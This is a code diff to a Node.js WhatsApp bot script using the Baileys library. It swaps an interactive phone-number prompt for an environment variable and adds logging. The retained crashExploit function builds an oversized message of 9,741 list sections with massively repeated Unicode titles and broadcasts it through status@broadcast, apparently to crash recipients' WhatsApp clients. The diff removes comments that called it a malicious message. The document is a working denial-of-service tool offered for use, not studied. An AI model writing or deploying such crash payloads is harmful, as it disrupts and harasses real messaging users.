@@ -1,13 +1,16 @@
 const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
 const P = require("pino");
-const readline = require("readline");
+const fs = require("fs");
 
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
+// ========== LEE EL NÚMERO DESDE VARIABLE DE ENTORNO ==========
+const PHONE_NUMBER = process.env.PHONE_NUMBER;
+if (!PHONE_NUMBER) {
+    console.error("❌ ERROR: Debes configurar PHONE_NUMBER en las variables de entorno.");
+    console.error("📌 Ejemplo: PHONE_NUMBER=521234567890");
+    process.exit(1);
+}
 
-const ask = (q) => new Promise(res => rl.question(q, res));
+console.log(`📱 Usando número: ${PHONE_NUMBER}`);
 
 async function start() {
     const { state, saveCreds } = await useMultiFileAuthState("auth");
@@ -33,30 +36,29 @@ async function start() {
             if (reason !== DisconnectReason.loggedOut) {
                 console.log("🔄 Reconectando...");
                 start();
+            } else {
+                console.log("🔒 Sesión cerrada. Elimina la carpeta auth y vuelve a intentar.");
             }
         }
     });
 
     if (!sock.authState.creds.registered) {
-        const number = await ask("📱 Ingresa tu número (ej: 521234567890): ");
         try {
-            const code = await sock.requestPairingCode(number);
+            const code = await sock.requestPairingCode(PHONE_NUMBER);
             console.log("\n🔑 Código de vinculación:", code);
             console.log("📲 Abre WhatsApp > Dispositivos vinculados > Vincular con código de 8 dígitos\n");
         } catch (e) {
-            console.log("❌ Error:", e.message);
+            console.log("❌ Error al solicitar pairing:", e.message);
         }
     }
 }
 
 async function crashExploit(sock) {
-    // 1. Crear la lista masiva de opciones
     const delaymention = Array.from({ length: 9741 }, (_, r) => ({
         title: "᭯".repeat(9741),
         rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
     }));
 
-    // 2. Crear el mensaje malicioso
     const MSG = {
         viewOnceMessage: {
             message: {
@@ -88,7 +90,6 @@ async function crashExploit(sock) {
         }
     };
 
-    // 3. Enviar el estado al broadcast
     const msg = generateWAMessageFromContent("status@broadcast", MSG, {});
 
     try {
